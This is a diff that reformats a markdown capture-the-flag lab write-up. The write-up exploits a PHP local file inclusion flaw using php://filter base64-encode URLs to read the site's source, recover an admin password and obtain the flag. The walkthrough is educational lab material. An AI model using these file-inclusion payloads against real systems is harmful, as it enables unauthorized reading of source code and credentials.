@@ -9,20 +9,19 @@ date: 2023-01-31
 # Simple Web 0x08(Lab - My First Meow Website)
 <!-- more -->
 ###### tags: `NTUSTWS` `CTF` `Web`
-Challenge: http://h4ck3r.quest:8400/
-Target: Login as Admin
+* Challenge: http://h4ck3r.quest:8400/
+* Target: Login as Admin
 
 ## Background
-[PHP 偽協議 (一) ](https://ithelp.ithome.com.tw/articles/10245020)
-[Web Security 0x1](https://youtu.be/_hasOTGximc?t=2855)
+* [PHP 偽協議 (一) ](https://ithelp.ithome.com.tw/articles/10245020)
+* [Web Security 0x1](https://youtu.be/_hasOTGximc?t=2855)
 
 ## Exploit
-1. Observe
-According to the URL, `http://h4ck3r.quest:8400/?page=inc/home`, it might have `LFI` problem.
+1. Observe: According to the URL, `http://h4ck3r.quest:8400/?page=inc/home`, it might have `LFI` problem.
 2. Use `php://filter` to read page
-    `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home`
-    :::spoiler page source code
-    ```php=
+    * `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home`
+    * source code
+    ```php
     <!DOCTYPE html>
     <html lang="en">
 
@@ -67,12 +66,10 @@ According to the URL, `http://h4ck3r.quest:8400/?page=inc/home`, it might have `
 
     </html>
     ```
-    :::
-3. Observe page source code
-We know that `admin.php` is under `/` directory.
-`http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin`
+3. Observe page source code: We know that `admin.php` is under `/` directory.
+    * `http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin`
     :::spoiler admin source code
-    ```php=
+    ```php
     <h1>Admin Panel</h1>
     <form>
         <input type="text" name="username" value="admin">
@@ -91,5 +88,4 @@ We know that `admin.php` is under `/` directory.
 
     ?>
     ```
-    :::
 4. Then we get admin password is: `kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ`. Then we got flag!!!
